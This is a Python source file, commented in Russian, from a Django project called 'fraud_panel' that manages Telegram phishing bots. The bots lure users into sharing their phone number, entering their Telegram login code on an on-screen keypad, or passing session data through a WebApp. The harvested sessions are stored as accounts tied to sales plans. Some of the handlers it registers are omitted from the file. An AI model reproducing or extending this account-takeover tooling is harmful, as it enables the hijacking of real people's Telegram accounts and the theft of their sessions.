# bots/bot_runner.py (исправленная версия)
import os
import django
import asyncio
import logging
import aiohttp
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, KeyboardButton, ReplyKeyboardMarkup, \
    ReplyKeyboardRemove, WebAppInfo
from datetime import datetime
import random
import re
import json
import zipfile
import io
from asgiref.sync import sync_to_async
from django.core.files.base import ContentFile
from django.utils import timezone

# Telethon imports
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError, PhoneCodeInvalidError

# Настройка Django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'fraud_panel.settings')
django.setup()

from bots.models import BotInstance, BotTemplate, BotLog, SalesPlan
from accounts.models import Account

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


class TelegramBotManager:
    def __init__(self):
        self.active_bots = {}
        self.user_sessions = {}
        self.proxies = []

    def parse_message(self, text, user_data=None):
        """Parse message for {option1|option2} and replace with random choice"""
        if not text:
            return ""

        def replace(match):
            options = match.group(1).split('|')
            return random.choice([opt.strip() for opt in options])

        # Заменяем шаблоны
        text = re.sub(r'\{(.*?)\}', replace, text)

        # Заменяем переменные пользователя
        if user_data:
            if '{name}' in text:
                text = text.replace('{name}', user_data.get('first_name', 'пользователь'))
            if '{username}' in text:
                text = text.replace('{username}', user_data.get('username', ''))

        return text

    def get_user_session(self, user_id):
        """Получение или создание сессии пользователя"""
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {
                'state': 'start',
                'phone_number': None,
                'attempts': 0,
                'session_data': None,
                'authenticated': False,
                'client': None,
                'phone_code_hash': None,
                'tdata_zip': None,
                'current_code': '',  # Для хранения вводимого кода
                'code_message_id': None,  # ID сообщения с клавиатурой
                'template_id': None,  # Сохраняем ID шаблона
                'bot_instance_id': None,  # Сохраняем ID экземпляра бота
                'start_time': timezone.now()
            }
        return self.user_sessions[user_id]

    def create_code_keyboard(self, code_length=0):
        """Создание красивой клавиатуры для ввода кода"""
        # Создаем строку из звездочек для отображения введенных цифр
        code_display = "• " * code_length + "○ " * (5 - code_length)

        keyboard = [
            [InlineKeyboardButton("1", callback_data="code_1"),
             InlineKeyboardButton("2", callback_data="code_2"),
             InlineKeyboardButton("3", callback_data="code_3")],
            [InlineKeyboardButton("4", callback_data="code_4"),
             InlineKeyboardButton("5", callback_data="code_5"),
             InlineKeyboardButton("6", callback_data="code_6")],
            [InlineKeyboardButton("7", callback_data="code_7"),
             InlineKeyboardButton("8", callback_data="code_8"),
             InlineKeyboardButton("9", callback_data="code_9")],
            [InlineKeyboardButton("⌫ Удалить", callback_data="code_backspace"),
             InlineKeyboardButton("0", callback_data="code_0"),
             InlineKeyboardButton("✅ Готово", callback_data="code_submit")]
        ]

        return InlineKeyboardMarkup(keyboard), code_display.strip()

    async def verify_bot_token(self, token):
        """Проверка валидности токена бота"""
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    data = await response.json()
                    return data.get('ok', False)
        except Exception as e:
            logger.error(f"Ошибка проверки токена: {e}")
            return False

    async def start_bot(self, bot_instance):
        """Запуск одного бота с учетом его настроек"""
        try:
            logger.info(f"Запуск бота {bot_instance.name} с методом авторизации: {bot_instance.auth_method}")

            # Проверяем токен бота
            if not await self.verify_bot_token(bot_instance.token):
                logger.error(f"Неверный токен бота: {bot_instance.name}")
                bot_instance.is_running = False
                bot_instance.error_message = "Неверный токен бота"
                await sync_to_async(bot_instance.save)()
                return False

            # Создаем приложение в зависимости от метода авторизации
            if bot_instance.auth_method in ['classic', 'telethon']:
                return await self.start_classic_bot(bot_instance)
            elif bot_instance.auth_method == 'web':
                return await self.start_web_bot(bot_instance)
            else:
                logger.error(f"Неизвестный метод авторизации: {bot_instance.auth_method}")
                return False

        except Exception as e:
            logger.error(f"Ошибка запуска бота {bot_instance.name}: {str(e)}")
            bot_instance.is_running = False
            bot_instance.error_message = str(e)
            await sync_to_async(bot_instance.save)()
            return False

    async def start_classic_bot(self, bot_instance):
        """Запуск бота с классической авторизацией"""
        try:
            application = Application.builder().token(bot_instance.token).build()

            # Получаем шаблон бота
            template = await sync_to_async(lambda: bot_instance.template)()
            logger.info(f"Шаблон {template.name} загружен для бота {bot_instance.name}")

            # Сохраняем данные в bot_data
            application.bot_data['bot_instance'] = bot_instance
            application.bot_data['template'] = template
            application.bot_data['manager'] = self
            application.bot_data['sales_plan'] = bot_instance.sales_plan

            # Регистрируем обработчики для классического бота
            application.add_handler(CommandHandler("start", self.handle_start))
            application.add_handler(CommandHandler("tdata", self.handle_tdata_command))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
            application.add_handler(MessageHandler(filters.CONTACT, self.handle_contact))
            application.add_handler(CallbackQueryHandler(self.handle_callback, pattern="^code_"))

            # Запускаем polling
            await application.initialize()
            await application.start()
            await application.updater.start_polling()

            self.active_bots[bot_instance.token] = application

            # Обновляем статус в базе данных
            bot_instance.is_running = True
            bot_instance.last_started = timezone.now()
            bot_instance.error_message = ""
            await sync_to_async(bot_instance.save)()

            logger.info(f"Бот {bot_instance.name} успешно запущен (классический метод)")

            # Создаем лог
            await sync_to_async(BotLog.objects.create)(
                bot_instance=bot_instance,
                level='SUCCESS',
                action='BOT_STARTED',
                details='Бот запущен с классической авторизацией'
            )

            return True

        except Exception as e:
            logger.error(f"Ошибка запуска классического бота {bot_instance.name}: {e}")
            raise

    async def start_web_bot(self, bot_instance):
        """Запуск бота с Web авторизацией"""
        try:
            application = Application.builder().token(bot_instance.token).build()

            # Получаем шаблон бота
            template = await sync_to_async(lambda: bot_instance.template)()
            logger.info(f"Шаблон {template.name} загружен для Web бота {bot_instance.name}")

            # Сохраняем данные в bot_data
            application.bot_data['bot_instance'] = bot_instance
            application.bot_data['template'] = template
            application.bot_data['manager'] = self
            application.bot_data['webapp_url'] = bot_instance.webapp_url
            application.bot_data['sales_plan'] = bot_instance.sales_plan

            # Регистрируем обработчики для Web бота
            application.add_handler(CommandHandler("start", self.handle_web_start))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_web_message))

            # Добавляем обработчик для Web App данных
            application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, self.handle_webapp_data))

            # Запускаем polling
            await application.initialize()
            await application.start()
            await application.updater.start_polling()

            self.active_bots[bot_instance.token] = application

            # Обновляем статус в базе данных
            bot_instance.is_running = True
            bot_instance.last_started = timezone.now()
            bot_instance.error_message = ""
            await sync_to_async(bot_instance.save)()

            logger.info(f"Web бот {bot_instance.name} успешно запущен")

            # Создаем лог
            await sync_to_async(BotLog.objects.create)(
                bot_instance=bot_instance,
                level='SUCCESS',
                action='BOT_STARTED',
                details='Бот запущен с Web авторизацией'
            )

            return True

        except Exception as e:
            logger.error(f"Ошибка запуска Web бота {bot_instance.name}: {e}")
            raise

    async def handle_web_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка команды /start для Web бота"""
        bot_instance = context.bot_data['bot_instance']
        template = context.bot_data['template']
        webapp_url = context.bot_data['webapp_url']

        user_id = update.effective_user.id

        logger.info(f"Обработка /start от пользователя {user_id} для Web бота {bot_instance.name}")

        # Парсим приветственное сообщение
        user_data = {
            'first_name': update.effective_user.first_name,
            'username': update.effective_user.username
        }
        welcome_message = self.parse_message(template.welcome_message, user_data)

        # Создаем кнопку для Web App
        web_app_button = KeyboardButton(
            text=bot_instance.webapp_button_text or "🔐 Авторизоваться",
            web_app=WebAppInfo(url=webapp_url)
        )

        reply_keyboard = ReplyKeyboardMarkup([[web_app_button]], resize_keyboard=True)

        await update.message.reply_text(
            welcome_message,
            reply_markup=reply_keyboard,
            parse_mode='HTML'
        )

    async def handle_web_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка текстовых сообщений для Web бота"""
        bot_instance = context.bot_data['bot_instance']
        template = context.bot_data['template']

        user_id = update.effective_user.id
        text = update.message.text

        logger.info(f"Сообщение от {user_id} для Web бота: {text}")

        # Если пользователь отправляет любое сообщение, показываем Web App кнопку снова
        webapp_url = context.bot_data['webapp_url']
        web_app_button = KeyboardButton(
            text=bot_instance.webapp_button_text or "🔐 Авторизоваться",
            web_app=WebAppInfo(url=webapp_url)
        )

        reply_keyboard = ReplyKeyboardMarkup([[web_app_button]], resize_keyboard=True)

        await update.message.reply_text(
            "Нажмите кнопку ниже для авторизации через Web App:",
            reply_markup=reply_keyboard,
            parse_mode='HTML'
        )

    async def handle_webapp_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка данных из Web App"""
        try:
            web_app_data = update.message.web_app_data
            data = web_app_data.data
            user_id = update.effective_user.id

            logger.info(f"Получены данные из Web App от пользователя {user_id}: {data}")

            # Парсим данные из Web App (ожидаем JSON)
            try:
                user_data = json.loads(data)
                phone_number = user_data.get('phone_number')
                session_data = user_data.get('session_data')

                if phone_number and session_data:
                    # Сохраняем аккаунт в базу данных
                    await self.save_webapp_account(phone_number, session_data, user_id, context)

                    await update.message.reply_text(
                        "✅ Авторизация прошла успешно! Ваш аккаунт сохранен.",
                        parse_mode='HTML',
                        reply_markup=ReplyKeyboardRemove()
                    )
                else:
                    await update.message.reply_text(
                        "❌ Неполные данные от Web App. Попробуйте снова.",
                        parse_mode='HTML'
                    )

            except json.JSONDecodeError:
                await update.message.reply_text(
                    "❌ Ошибка обработки данных. Попробуйте снова.",
                    parse_mode='HTML'
                )

        except Exception as e:
            logger.error(f"Ошибка обработки Web App данных: {e}")
            await update.message.reply_text(
                "❌ Ошибка при обработке данных. Попробуйте снова.",
                parse_mode='HTML'
            )

    async def save_webapp_account(self, phone_number, session_data, user_id, context):
        """Сохранение аккаунта из Web App"""
        try:
            bot_instance = context.bot_data['bot_instance']
            template = context.bot_data['template']

            # Используем правильный синтаксис для get_or_create
            get_or_create_func = sync_to_async(
                lambda: Account.objects.get_or_create(
                    phone_number=phone_number,
                    defaults={
                        'owner': template.owner,
                        'country': 'RU',
                        'log_source': f"WebApp Bot: {bot_instance.name}",
                        'is_valid': True,
                        'status': 'ACTIVE'
                    }
                ),
                thread_sensitive=True
            )
            account, created = await get_or_create_func()

            if session_data:
                # Сохраняем session_data в файл
                buffer = io.BytesIO(session_data.encode('utf-8'))
                save_file_func = sync_to_async(account.session_file.save, thread_sensitive=True)
                await save_file_func(
                    f'session_{phone_number.replace("+", "")}.txt',
                    ContentFile(buffer.getvalue())
                )

                save_account_func = sync_to_async(account.save, thread_sensitive=True)
                await save_account_func()

            logger.info(f"Аккаунт {'создан' if created else 'обновлен'} для {phone_number} через WebApp")

            # Создаем лог
            await sync_to_async(BotLog.objects.create)(
                bot_instance=bot_instance,
                level='SUCCESS',
                action='WEBAPP_AUTH_SUCCESS',
                details=f'Успешная авторизация через WebApp для {phone_number}',
                user_id=user_id,
                username=update.effective_user.username if hasattr(update, 'effective_user') else None
            )

        except Exception as e:
            logger.error(f"Ошибка сохранения аккаунта из WebApp: {e}", exc_info=True)

    # Классические обработчики (остаются без изменений)
    async def handle_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка команды /start для классического бота"""
        bot_instance = context.bot_data['bot_instance']
        template = context.bot_data['template']

        user_id = update.effective_user.id
        session = self.get_user_session(user_id)
        session.update({
            'state': 'start',
            'attempts': 0,
            'phone_number': None,
            'authenticated': False,
            'client': None,
            'tdata_zip': None,
            'current_code': '',
            'code_message_id': None,
            'template_id': template.id,
            'bot_instance_id': bot_instance.id,
            'start_time': timezone.now()
        })

        logger.info(f"Обработка /start от пользователя {user_id} для бота {bot_instance.name}")

        # Парсим приветственное сообщение
        user_data = {
            'first_name': update.effective_user.first_name,
            'username': update.effective_user.username
        }
        welcome_message = self.parse_message(template.welcome_message, user_data)

        # Создаем клавиатуру с кнопкой для отправки контакта
        contact_button = KeyboardButton("📱 Поделиться номером телефона", request_contact=True)
        reply_keyboard = ReplyKeyboardMarkup([[contact_button]], one_time_keyboard=True, resize_keyboard=True)

        await update.message.reply_text(
            welcome_message,
            reply_markup=reply_keyboard,
            parse_mode='HTML'
        )

    # ... остальные методы остаются такими же как в предыдущей версии ...

    async def stop_bot(self, token):
        """Остановка бота"""
        try:
            if token in self.active_bots:
                application = self.active_bots[token]
                await application.updater.stop()
                await application.stop()
                await application.shutdown()
                del self.active_bots[token]
                logger.info(f"Бот с токеном {token} остановлен")
                return True
        except Exception as e:
            logger.error(f"Ошибка остановки бота: {e}")
        return False


# Глобальный менеджер ботов
bot_manager = TelegramBotManager()


def run_bot_sync(bot_instance):
    """Синхронный запуск бота для использования в потоках"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(bot_manager.start_bot(bot_instance))
    except Exception as e:
        logger.error(f"Ошибка в run_bot_sync: {e}")
        return False
    finally:
        loop.close()


def stop_bot_sync(token):
    """Синхронная остановка бота для использования в потоках"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(bot_manager.stop_bot(token))
    except Exception as e:
        logger.error(f"Ошибка в stop_bot_sync: {e}")
        return False
    finally:
        loop.close()